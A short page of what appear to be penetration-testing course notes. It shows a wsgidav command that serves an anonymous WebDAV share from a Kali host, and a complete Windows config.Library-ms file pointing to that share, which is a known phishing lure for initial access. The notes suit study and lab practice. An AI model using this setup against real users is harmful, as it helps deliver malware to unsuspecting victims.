# Page 3

Setting up WebDAV:

{% code overflow="wrap" %}
```sh
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
{% endcode %}

* **--auth=anonymous:** disable authentication&#x20;
* **--root /home/kali/webdav/:** root of directory of webdav share

Save and close config.Library-ms in Visual Studio Code:

{% code title="config.Library-ms " overflow="wrap" %}
```visual-basic
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}

* `<url>http://192.168.119.2</url>`: points to webdav share
* embedds connection to webdav share





